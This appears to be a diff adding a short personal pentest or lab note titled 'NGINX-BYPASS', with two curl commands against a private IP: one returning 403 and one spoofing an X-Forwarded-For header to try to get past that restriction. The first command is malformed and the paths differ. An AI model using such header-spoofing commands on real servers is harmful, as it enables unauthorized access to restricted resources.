@@ -1,0 +1,9 @@
+NGINX-BYPASS
+curl -H http://10.194.0.68/.misc/   <----this gives you a 403 forbidden code
+
+
+curl -H 'X-forwarded-for:10.194.0.67' -I http://10.194.0.68/misc/   <----this may be able to bypass the 403 code because of the x forwarded header :)
+
+
+
+
